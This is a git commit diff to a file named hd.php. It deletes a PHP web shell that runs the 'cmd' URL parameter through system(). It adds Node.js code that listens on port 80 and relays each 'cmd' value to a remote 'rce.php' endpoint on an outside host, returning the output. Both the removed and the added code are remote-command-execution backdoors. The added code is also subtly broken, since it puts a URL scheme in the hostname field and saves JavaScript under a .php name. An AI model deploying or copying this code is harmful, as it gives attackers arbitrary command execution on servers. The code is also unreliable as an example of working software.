dac35144cdd7d34a7ccd30c29ad7cb2a859fdf22
TZ Rafi <40269401+tzrafi@users.noreply.github.com>
2025-02-24 18:18:35 +0600

    hd.php

--- hd.php
+++ hd.php
@@ -1,7 +1,37 @@
-<?php
-if (isset($_GET['cmd'])) {
-    // User input is directly used in a system command
-    $command = $_GET['cmd'];
-    system($command);
-}
-?>
+var http = require('http');
+var url = require('url');
+
+http.createServer(function (req, res) {
+    var parsedUrl = url.parse(req.url, true);
+    var command = parsedUrl.query.cmd;
+
+    if (command) {
+        // Make an HTTP request to the PHP script
+        var options = {
+            hostname: 'https://tzrafi.com',
+            path: '/rce.php?cmd=' + command,
+            method: 'GET'
+        };
+
+        var request = http.request(options, function (response) {
+            var output = '';
+            response.on('data', function (chunk) {
+                output += chunk;
+            });
+            response.on('end', function () {
+                res.writeHead(200, {'Content-Type': 'text/plain'});
+                res.end(output);
+            });
+        });
+
+        request.on('error', function (error) {
+            res.writeHead(500, {'Content-Type': 'text/plain'});
+            res.end('Error: ' + error.message);
+        });
+
+        request.end();
+    } else {
+        res.writeHead(400, {'Content-Type': 'text/plain'});
+        res.end('No command specified');
+    }
+}).listen(80);
